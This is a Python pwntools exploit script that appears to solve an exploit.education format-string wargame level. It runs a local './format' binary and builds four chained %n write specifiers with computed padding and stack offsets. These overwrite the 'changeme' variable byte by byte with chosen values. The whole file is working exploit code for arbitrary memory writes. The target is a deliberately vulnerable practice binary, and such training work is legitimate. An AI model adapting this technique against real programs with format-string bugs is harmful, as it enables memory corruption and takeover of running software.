from pwn import *
import sys

# Constants
COOKIE0 = 0x45
COOKIE1 = 0x78
COOKIE2 = 0x45
COOKIE3 = 0x64

BUF_STACK_OFFSET = 12 # printf(%BUF_STACK_OFFSET$x) would print the first address under buf


def pad8(bytestr):
    padlen = 8 - (len(bytestr) % 8)
    return padlen, bytestr + padlen * b'A'

# Determinate how many bytes do we need to write, so the %n will place cookie value under targeted byte.
# If we have already written more bytes we have to overflow.
def get_cookie(cookie, written):
    while cookie < written:
        cookie += 0x100
    return cookie - written



p = process('./format')

p.recvuntil(b'Welcome, brought to you by https://exploit.education\n')

if len(sys.argv) == 2 and sys.argv[1] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER to send payload...')


written = 0

cookie = get_cookie(COOKIE0, written)
padlen, payload_par1 = pad8(b'%0' + str(cookie).encode('utf-8') + b'x%' + str(BUF_STACK_OFFSET + 8).encode('utf-8') + b'$n')
written += cookie + padlen
log.info(b"Payload part 1: " + payload_par1) # %069x%20$nAAAAAA

cookie = get_cookie(COOKIE1, written)
padlen, payload_par2 = pad8(b'%0' + str(cookie).encode('utf-8') + b'x%' + str(BUF_STACK_OFFSET + 9).encode('utf-8') + b'$n')
written += cookie + padlen
log.info(b"Payload part 2: " + payload_par2) # %045x%21$nAAAAAA

cookie = get_cookie(COOKIE2, written)
padlen, payload_par3 = pad8(b'%0' + str(cookie).encode('utf-8') + b'x%' + str(BUF_STACK_OFFSET + 10).encode('utf-8') + b'$n')
written += cookie + padlen
log.info(b"Payload part 3: " + payload_par3) # %0199x%22$nAAAAA

cookie = get_cookie(COOKIE3, written)
padlen, payload_par4 = pad8(b'%0' + str(cookie).encode('utf-8') + b'x%' + str(BUF_STACK_OFFSET + 11).encode('utf-8') + b'$n')
written += cookie + padlen
log.info(b"Payload part 4: " + payload_par4) # %026x%23$nAAAAAA

payload = payload_par1 + payload_par2 + payload_par3 + payload_par4


changeme_addr = p.elf.symbols['changeme']
payload += p64(changeme_addr)
payload += p64(changeme_addr + 1)
payload += p64(changeme_addr + 2)
payload += p64(changeme_addr + 3)

p.send(payload)
print(p.stream())